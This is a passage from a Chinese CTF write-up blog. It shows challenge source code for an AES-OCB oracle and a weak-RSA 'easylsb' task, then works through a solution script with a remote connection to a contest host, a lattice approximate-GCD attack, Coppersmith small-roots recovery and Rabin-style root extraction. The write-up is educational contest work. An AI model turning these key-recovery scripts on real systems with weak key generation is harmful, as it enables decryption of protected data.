class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        signal.alarm(<span class="number">60</span>)</span><br><span class="line">        self.send(BANNER)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.proof_of_work():</span><br><span class="line">            self.send(<span class="string">b&#x27;[!] Wrong!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        self.send(<span class="string">b&#x27;[+] Welcome my friend!&#x27;</span>)</span><br><span class="line">        self.send(<span class="string">b&#x27;[+] Can you find the secret through the easy encryption system?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        aes = AES(<span class="number">128</span>)</span><br><span class="line">        self.ocb = OCB(aes)</span><br><span class="line">        KEY = os.urandom(<span class="number">16</span>)</span><br><span class="line">        self.ocb.setKey(KEY)</span><br><span class="line">        self.NONCEs = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            self.send(MENU, newline=<span class="literal">False</span>)</span><br><span class="line">            choice = self.recv()</span><br><span class="line">            <span class="keyword">if</span>(choice == <span class="string">b&#x27;1&#x27;</span>):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    self.send(<span class="string">b&#x27;[+] Please input your nonce&#x27;</span>)</span><br><span class="line">                    nonce = b64decode(self.recv())</span><br><span class="line">                    self.send(<span class="string">b&#x27;[+] Please input your message&#x27;</span>)</span><br><span class="line">                    message = b64decode(self.recv())</span><br><span class="line">                    associate_data = <span class="string">b&#x27;from baby&#x27;</span></span><br><span class="line">                    ciphertext, tag = self.encrypt(nonce, message, associate_data)</span><br><span class="line">                    self.send(<span class="string">b&quot;[+] ciphertext: &quot;</span> + b64encode(ciphertext))</span><br><span class="line">                    self.send(<span class="string">b&quot;[+] tag: &quot;</span> + b64encode(tag))</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    self.send(<span class="string">b&quot;[!] ERROR!&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span>(choice == <span class="string">b&#x27;2&#x27;</span>):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    self.send(<span class="string">b&#x27;[+] Please input your nonce&#x27;</span>)</span><br><span class="line">                    nonce = b64decode(self.recv())</span><br><span class="line">                    self.send(<span class="string">b&#x27;[+] Please input your ciphertext&#x27;</span>)</span><br><span class="line">                    ciphertext = b64decode(self.recv())</span><br><span class="line">                    self.send(<span class="string">b&#x27;[+] Please input your tag&#x27;</span>)</span><br><span class="line">                    tag = b64decode(self.recv())</span><br><span class="line">                    self.send(<span class="string">b&#x27;[+] Please input your associate data&#x27;</span>)</span><br><span class="line">                    associate_data = b64decode(self.recv())</span><br><span class="line">                    <span class="keyword">if</span> associate_data == <span class="string">b&#x27;from admin&#x27;</span>:</span><br><span class="line">                        self.send(<span class="string">b&#x27;[!] You are not admin!&#x27;</span>)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    message = self.decrypt(nonce, ciphertext, tag, associate_data)</span><br><span class="line">                    self.send(<span class="string">b&#x27;[+] plaintext: &#x27;</span> + b64encode(message))</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    self.send(<span class="string">b&quot;[!] ERROR!&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span>(choice == <span class="string">b&#x27;3&#x27;</span>):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    nonce = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span></span><br><span class="line">                    message = flag</span><br><span class="line">                    associate_data = <span class="string">b&#x27;from admin&#x27;</span></span><br><span class="line">                    ciphertext, tag = self.encrypt(nonce, message, associate_data)</span><br><span class="line">                    self.send(<span class="string">b&quot;[+] ciphertext: &quot;</span> + b64encode(ciphertext))</span><br><span class="line">                    self.send(<span class="string">b&quot;[+] tag: &quot;</span> + b64encode(tag))</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    self.send(<span class="string">b&quot;[!] ERROR!&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span>(choice == <span class="string">b&#x27;4&#x27;</span>):</span><br><span class="line">                self.send(<span class="string">b&#x27;[+] Bye~&#x27;</span>)</span><br><span class="line">                self.send(<span class="string">b&#x27;[+] See you next time!&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.send(<span class="string">b&#x27;[!] What are you doing???&#x27;</span>)</span><br><span class="line">                self.send(<span class="string">b&#x27;[!] Go away!&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        self.request.close()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadedServer</span>(<span class="params">socketserver.ThreadingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkedServer</span>(<span class="params">socketserver.ForkingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10001</span></span><br><span class="line">    server = ForkedServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    <span class="built_in">print</span>(HOST, PORT)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>

<p>津门杯和红明谷有类似的题目，ocb模式的AES提供了身份验证，还没有仔细研究过该模式下的流程，光看代码，没有什么方法可以绕过那个<code>associate_data == b&#39;from admin&#39;</code></p>
<h2 id="Crypto-easylsb（recuring）"><a href="#Crypto-easylsb（recuring）" class="headerlink" title="Crypto-easylsb（recuring）"></a>Crypto-easylsb（recuring）</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">password = <span class="comment"># Hidden</span></span><br><span class="line">flag = (<span class="string">&#x27;flag&#123;&#x27;</span> + <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&#x27;&#125;&#x27;</span>).encode()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>():</span></span><br><span class="line">    random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">    proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]).encode()</span><br><span class="line">    digest = sha256(proof).hexdigest()</span><br><span class="line">    printf(<span class="string">&quot;sha256(XXXX+%s) == %s&quot;</span> % (proof[<span class="number">4</span>:].decode(),digest))</span><br><span class="line">    printf(<span class="string">&#x27;Give me XXXX:&#x27;</span>)</span><br><span class="line">    x = read_str()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x) != <span class="number">4</span> <span class="keyword">or</span> sha256(x.encode()+proof[<span class="number">4</span>:]).hexdigest() != digest: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printf</span>(<span class="params">message</span>):</span></span><br><span class="line">    sys.stdout.write(<span class="string">&#x27;&#123;0&#125;\n&#x27;</span>.<span class="built_in">format</span>(message))</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    sys.stderr.flush()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_str</span>():</span></span><br><span class="line">    <span class="keyword">return</span> sys.stdin.readline().strip()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_int</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(sys.stdin.readline().strip())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next_prime</span>(<span class="params">a</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> isPrime(a):</span><br><span class="line">        a += <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span>(<span class="params">a</span>):</span></span><br><span class="line">    suffix = getPrime(<span class="number">368</span>)</span><br><span class="line">    <span class="keyword">return</span> next_prime(a ** <span class="number">2</span> + suffix + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_pubkey</span>(<span class="params">key</span>):</span></span><br><span class="line">    p, q = get_prime(getPrime(<span class="number">512</span>)), get_prime(key)</span><br><span class="line">    n = p * q</span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">airdrop</span>(<span class="params">a</span>):</span></span><br><span class="line">    n = generate_pubkey(a)</span><br><span class="line">    printf(<span class="string">&#x27;gift: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(n))</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hint</span>(<span class="params">n, e, c</span>):</span></span><br><span class="line">    printf(<span class="string">&#x27;n = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(n))</span><br><span class="line">    printf(<span class="string">&#x27;e = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(e))</span><br><span class="line">    printf(<span class="string">&#x27;c = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(c))</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>():</span></span><br><span class="line">    p = get_prime(getPrime(<span class="number">512</span>))</span><br><span class="line">    e = <span class="number">0x1000</span></span><br><span class="line">    c = <span class="built_in">pow</span>(bytes_to_long(flag), e, p)</span><br><span class="line">    </span><br><span class="line">    hint(p, e, c)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>():</span></span><br><span class="line">    printf(<span class="string">&#x27;Input your password:&#x27;</span>)</span><br><span class="line">    user_input = read_str()</span><br><span class="line">    <span class="keyword">if</span> user_input.encode() == password:</span><br><span class="line">        leak()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        printf(<span class="string">&#x27;Wrong&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    a = getPrime(<span class="number">512</span>)</span><br><span class="line">    p = get_prime(a)</span><br><span class="line">    q = get_prime(getPrime(<span class="number">512</span>))</span><br><span class="line">    n = p * q</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    max_time = <span class="number">5</span></span><br><span class="line">    password_enc = <span class="built_in">pow</span>(bytes_to_long(password), e, n)</span><br><span class="line">    </span><br><span class="line">    printf(<span class="string">&#x27;====================================&#x27;</span>,)</span><br><span class="line">    printf(<span class="string">&#x27;1. Airdrop                          &#x27;</span>,)</span><br><span class="line">    printf(<span class="string">&#x27;2. Backdoor                         &#x27;</span>,)</span><br><span class="line">    printf(<span class="string">&#x27;3. Hint                             &#x27;</span>,)</span><br><span class="line">    printf(<span class="string">&#x27;4. Exit                             &#x27;</span>,)</span><br><span class="line">    printf(<span class="string">&#x27;====================================&#x27;</span>,)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            printf(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">            choice = read_int()</span><br><span class="line">            <span class="keyword">if</span> choice == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> max_time &gt; <span class="number">1</span>:</span><br><span class="line">                    airdrop(a)</span><br><span class="line">                    max_time -= <span class="number">1</span></span><br><span class="line">                    printf(<span class="string">&#x27;Done!&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    printf(<span class="string">&#x27;Greed will destroy you!&#x27;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> choice == <span class="number">2</span>:</span><br><span class="line">                backdoor()</span><br><span class="line">                printf(<span class="string">&#x27;Done!&#x27;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> choice == <span class="number">3</span>:</span><br><span class="line">                hint(n, e, password_enc)</span><br><span class="line">                printf(<span class="string">&#x27;Done!&#x27;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> choice == <span class="number">4</span>:</span><br><span class="line">                printf(<span class="string">&#x27;bye~&#x27;</span>)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                printf(<span class="string">&#x27;Invalid!&#x27;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>流程比较简单，虽然不会，但是思路比较清晰，通过<strong>4组gift和1个n</strong>求得a和p$\rightarrow$解密password$\rightarrow$在e=4096，模数是素数下解密flag</p>
<p>一开始通过尚师傅提醒，尝试之后发现，q开根后取整的结果是和a一样的<br>$$<br>\lfloor \sqrt{q} \rfloor=a<br>$$<br>然后假设$q=next_prime(a^2+suffix_1+1),\ p=next_prime(b^2+suffix_2+1)$</p>
<p>那么n=pq，给n开根号可以得到ab的高位，但也不知道拿来怎么用</p>
<p>保存了一组数据下来，以后有机会研究</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nc 47.104.243.99 9999</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag = (&#x27;flag&#123;&#x27; + str(uuid.uuid4()) + &#x27;&#125;&#x27;).encode()</span></span><br><span class="line"><span class="comment"># print(flag)</span></span><br><span class="line"><span class="comment"># flag&#123;cb8365b5-a825-4c65-9251-b6827f0792ad&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>():</span></span><br><span class="line">    <span class="comment"># sha256(XXXX+cgDUNjezTPNSj91D) == 30fc93b19ef81e8755f3ee0e3df72722f66556b7636b5037f34d1beb981235b0</span></span><br><span class="line">    proof = sh.recvline()</span><br><span class="line">    tail = proof[<span class="number">12</span>:<span class="number">28</span>].decode()</span><br><span class="line">    HASH = proof[<span class="number">23</span>:<span class="number">97</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> product(string.ascii_letters + string.digits, repeat=<span class="number">4</span>):</span><br><span class="line">        head = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">        t = hashlib.sha256((head + tail).encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> t == HASH:</span><br><span class="line">            sh.sendline(head.encode())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work2</span>():</span></span><br><span class="line">    <span class="comment"># sha256(XXXX+cgDUNjezTPNSj91D) == 30fc93b19ef81e8755f3ee0e3df72722f66556b7636b5037f34d1beb981235b0</span></span><br><span class="line">    proof = sh.recvline()</span><br><span class="line">    tail = <span class="string">&#x27;eqbj8j6Z9xvz3YiV&#x27;</span></span><br><span class="line">    HASH = <span class="string">&#x27;b5808aff39327c9ac49d209d10fe3e27c898d49faffc956bbf1d73523c44ce77&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> product(string.ascii_letters + string.digits, repeat=<span class="number">4</span>):</span><br><span class="line">        head = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">        t = hashlib.sha256((head + tail).encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> t == HASH:</span><br><span class="line">            sh.sendline(head.encode())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&quot;47.104.243.99&quot;</span>, <span class="number">9999</span>)</span><br><span class="line">proof_of_work2()</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = <span class="number">124478026101165354098037876421627662624056206605515177686194103211430464934743129994417330643128683345849733014275487857184516763016301408033382676283620282332485581507315430690690813831282519976585364463744017296315372258981215919387679949709396064987889800074036410663927631478105899096723790945928412829187822284593750473740315866322998068351563015099367643886154042581191841533888375305195743073059105310700318861167337672659772641786687582718180589854118978820530842381081568922213227168617789474006973152602334271699398178963791154954792676067153150646411025449463253194489657095241613282942586704728903727611399</span></span><br><span class="line">c = <span class="number">90647155870804971113806442051901226002120015769259333554192477899450971338831255790857101662710560234954831825416787459228033373486077151217415092360097814474283515220281223555587026056325099266316005605716929634353603643319859645167427538563242884591102004934790399528462112789803351851769047685792159647390050985871679243422993775721776244067168064933786611606433105514418429089777322132633028815660525070271128628044386434106685643657668695364607215033856398608992051550288297119711825866170869469834444973857013360900452988222767960318998636640763573797297203544581343736625672669946528644260077687270041162148579</span></span><br><span class="line">gift1 = <span class="number">430643544402084432319325961880416327356872029175895120742910502784460696485981655831364057771978842374920289740546998744096646780935886278222230684528731470188637076148307527311922452490801045278988434801896164340653915198079023711297016090027381126073802620204314765869166624636941907534206046998568042400815444697126334029985946496452932477337335924863188276040631646131204436116708742280199903183210826719901897273260766069768314579353548171372586771188839003301749872795307598319516051259672117483195538538878148292313730887085591272354625175614366936749367007177827223031514498275753340915542939818624965339274541</span></span><br><span class="line">gift2 = <span class="number">279643881521430665779764628210196159031443254319916096260435206316116655701344325784134050728686231352816394212502789612947929220430466611004330150352137570405484127780364316335386736272544877793446702006665399064591475517610575894857804921152265901610537191780251376268112843688812459951190257679817490601282013470378644045696567456486059374094892490322848884260103728441765221196492288890565220765116737467020984854284776188063793107604665880577892150257025900438921323929874583349697921571156857890185078774883450481945134786456867498237937223992977125106207044050316201931335150865420643200300919950666792333800421</span></span><br><span class="line">gift3 = <span class="number">237902069859826089956710602458488697197969935460375469157966706791637991891038954423106099106663742928616105443683571279895168734280020803510641968762322744746722455831059684745613465616901995570874116303439549541932451281441959514629564655972962203744852006794160278105621063202850402448076034174743227230202591123961117876362833492478366233652816443873213201410433457033307944305406209168085355438156499669719905462067847881209129983251184647052314353242784174374088582263983943733709287614092898665984536781786084591414804290805713181580225096207601673326693693442261927044483426965621699507399608913104482509541829</span></span><br><span class="line">gift4 = <span class="number">131184496439376311814751172869309509301398236134030748081290782986296909958428702969677021306310259793511587606469385852829507392096577310273567455635233040499932518933927338330158300947934921792366825549482737059128276134653805578959896357503546949681198843822945160611138388841031519307824760189249466171835761078895545203381195921789823129815826662876576368032722825159838976137103324588326186884693453137115752294499574361951327089081432442184727065530788376603390307277709197418051468405219378610308912749832078805547917787498228816440083434077213552664217150489211767711038795362880479839885325109115335568243823</span></span><br></pre></td></tr></table></figure>

<p>现在可以好好复现一下这道题了</p>
<p>先是补充，得到a之后，那么由上面的结论可知$a^2$就是q的高位，那这不就是RSA已知p的高位攻击吗</p>
<p>不懂WP里的格是由哪个方程组得到的</p>
<hr>
<p>好了，第三波复现，还以为agcd是师傅打错了，原来是我菜了，是个论文<a href="https://martinralbrecht.wordpress.com/2020/03/21/the-approximate-gcd-problem/">Approximate GCD</a></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210903140354348.png" alt="image-20210903140354348"></p>
<p>看格式和题目是完全对应的</p>
<p>哈哈，看不太懂，拿了格就跑路</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210903141338898.png" alt="image-20210903141338898"></p>
<p>$x_i$显然就是五组$n_i$开根号得到的，这个上面也证实了；$\lambda$就是368，因为论文里的$r_i$就是题目中的$suffix_i+1$</p>
<p>这样对矩阵B进行<code>LLL()</code>得到的是$q_0\cdot 2^{\lambda +1}$，除以$2^{\lambda +1}$就是论文里的$q_0$了，也就是与$x_0$对应的那个</p>
<p>到此为止还少了一步，接着题目中的$n=pq$推导<br>$$<br>n=pq=(a^2+suffix_1+1)(b^2+suffix_2+1)<br>$$<br>设$\beta =\sqrt {b^2+suffix_2+1},\ \delta$为p开根后的低位，$r=\delta \beta$</p>
<p>给n开根<br>$$<br>\sqrt n=(a+\delta)\beta    =a\beta +r<br>$$<br>这就和论文里给的形式一样了，而我们刚求出来的$q_0$就是这里的$\beta$，最后$\lfloor\sqrt n/\beta \rfloor    =\lfloor (a\beta +r)/\beta\rfloor$，显然$r/\beta$已经是小数部分了，取整就完全舍去了，所以结果就是a</p>
<hr>
<p>求出来的ans应该是上文的b，先用这位师傅的脚本得到a</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> root</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = <span class="number">124478026101165354098037876421627662624056206605515177686194103211430464934743129994417330643128683345849733014275487857184516763016301408033382676283620282332485581507315430690690813831282519976585364463744017296315372258981215919387679949709396064987889800074036410663927631478105899096723790945928412829187822284593750473740315866322998068351563015099367643886154042581191841533888375305195743073059105310700318861167337672659772641786687582718180589854118978820530842381081568922213227168617789474006973152602334271699398178963791154954792676067153150646411025449463253194489657095241613282942586704728903727611399</span></span><br><span class="line">c = <span class="number">90647155870804971113806442051901226002120015769259333554192477899450971338831255790857101662710560234954831825416787459228033373486077151217415092360097814474283515220281223555587026056325099266316005605716929634353603643319859645167427538563242884591102004934790399528462112789803351851769047685792159647390050985871679243422993775721776244067168064933786611606433105514418429089777322132633028815660525070271128628044386434106685643657668695364607215033856398608992051550288297119711825866170869469834444973857013360900452988222767960318998636640763573797297203544581343736625672669946528644260077687270041162148579</span></span><br><span class="line">gift1 = <span class="number">430643544402084432319325961880416327356872029175895120742910502784460696485981655831364057771978842374920289740546998744096646780935886278222230684528731470188637076148307527311922452490801045278988434801896164340653915198079023711297016090027381126073802620204314765869166624636941907534206046998568042400815444697126334029985946496452932477337335924863188276040631646131204436116708742280199903183210826719901897273260766069768314579353548171372586771188839003301749872795307598319516051259672117483195538538878148292313730887085591272354625175614366936749367007177827223031514498275753340915542939818624965339274541</span></span><br><span class="line">gift2 = <span class="number">279643881521430665779764628210196159031443254319916096260435206316116655701344325784134050728686231352816394212502789612947929220430466611004330150352137570405484127780364316335386736272544877793446702006665399064591475517610575894857804921152265901610537191780251376268112843688812459951190257679817490601282013470378644045696567456486059374094892490322848884260103728441765221196492288890565220765116737467020984854284776188063793107604665880577892150257025900438921323929874583349697921571156857890185078774883450481945134786456867498237937223992977125106207044050316201931335150865420643200300919950666792333800421</span></span><br><span class="line">gift3 = <span class="number">237902069859826089956710602458488697197969935460375469157966706791637991891038954423106099106663742928616105443683571279895168734280020803510641968762322744746722455831059684745613465616901995570874116303439549541932451281441959514629564655972962203744852006794160278105621063202850402448076034174743227230202591123961117876362833492478366233652816443873213201410433457033307944305406209168085355438156499669719905462067847881209129983251184647052314353242784174374088582263983943733709287614092898665984536781786084591414804290805713181580225096207601673326693693442261927044483426965621699507399608913104482509541829</span></span><br><span class="line">gift4 = <span class="number">131184496439376311814751172869309509301398236134030748081290782986296909958428702969677021306310259793511587606469385852829507392096577310273567455635233040499932518933927338330158300947934921792366825549482737059128276134653805578959896357503546949681198843822945160611138388841031519307824760189249466171835761078895545203381195921789823129815826662876576368032722825159838976137103324588326186884693453137115752294499574361951327089081432442184727065530788376603390307277709197418051468405219378610308912749832078805547917787498228816440083434077213552664217150489211767711038795362880479839885325109115335568243823</span></span><br><span class="line"></span><br><span class="line">f = <span class="keyword">lambda</span> a: <span class="built_in">int</span>(root(a, <span class="number">2</span>))</span><br><span class="line">x0, x1, x2, x3, x4 = f(n), f(gift1), f(gift2), f(gift3), f(gift4)</span><br><span class="line"></span><br><span class="line">B = matrix(ZZ, [[<span class="number">2</span> ^ <span class="number">368</span>, x1, x2, x3, x4], [<span class="number">0</span>, -x0, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">0</span>, -x0, <span class="number">0</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -x0, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -x0]])</span><br><span class="line">L = B.LLL()</span><br><span class="line">ans = L[<span class="number">0</span>][<span class="number">0</span>] // <span class="number">2</span> ^ <span class="number">368</span></span><br><span class="line"></span><br><span class="line">p0 = <span class="built_in">abs</span>(ans)</span><br><span class="line">a = x0 // p0</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment"># a = 25582847577564670038612582668140373129129959651036453923605273284793860890291221263498753328353767798264241675861426056503889321642277844202986695039010291</span></span><br></pre></td></tr></table></figure>

<p>然后是熟悉的节奏，但和一般的已知p的高位攻击不一样，显然$a^2$已经和p的位数差不多了，只是不知道368位的suffix是多少，所以本质一样，用CopperSmith求小根的算法求出suffix；这里取kbits为369，因为368出不来，往大一点的地方取</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">25582847577564670038612582668140373129129959651036453923605273284793860890291221263498753328353767798264241675861426056503889321642277844202986695039010291</span></span><br><span class="line">n = <span class="number">124478026101165354098037876421627662624056206605515177686194103211430464934743129994417330643128683345849733014275487857184516763016301408033382676283620282332485581507315430690690813831282519976585364463744017296315372258981215919387679949709396064987889800074036410663927631478105899096723790945928412829187822284593750473740315866322998068351563015099367643886154042581191841533888375305195743073059105310700318861167337672659772641786687582718180589854118978820530842381081568922213227168617789474006973152602334271699398178963791154954792676067153150646411025449463253194489657095241613282942586704728903727611399</span></span><br><span class="line">pbar = a ** <span class="number">2</span></span><br><span class="line">kbits = <span class="number">369</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = pbar + x</span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)</span><br><span class="line"><span class="comment"># 967901962469872165537856438801710756065070673694594801499396171114255660549746759504438698205658088002955084386</span></span><br></pre></td></tr></table></figure>

<p>接下来RSA的常规步奏得到password</p>
<blockquote>
<p>Cou1d_I_get_Th3_passw03d_then_captu7e_the_fla9?</p>
</blockquote>
<p>因为比赛中没有获得flag的c，所以借这位师傅的一用</p>
<p>正如一开始所说的e是偶数，还是$2^{12}$，与$\varphi(p)=p-1$不互素，这个时候应该说<code>PUTAOAO，你的台词说错了哟。报仇的时候可不能说兲蛋什么的。应该是这样：吾名尚师傅，为了抚平吾友4XWi11之憾恨，以及让吾左侧朋友Y1m0在天之灵得以安息，吾势必要汝以4谢罪!</code></p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/X789FEG@489}U42@PTNVUY8.jpg" alt="img"/>

<p>平方根，有限域开方，Rabin一把梭</p>
<p>不过这里考虑到这里4096比较大，有限域开方会很慢吧，直接用nthroot_mod函数似乎并不行，传统的rabin是不行的因为模数是p；看了师傅的恍然大悟，为此特地去发了一篇关于<a href="https://blog.csdn.net/m0_49109277/article/details/120082896">rabin原理的博客</a></p>
<p>虽然不知道nthroot_mod为什么不行，由于<code>p % 4 = 3</code>符合rabin最基本的条件，之所以需要满足这个条件而这个条件也正是开方出来结果比较少的条件，所以直接开12次方没有压力</p>
<p>关键的代码<code>m1 = pow(c, (p + 1) // 4, p)</code>和<code>m2 = p - m1</code></p>
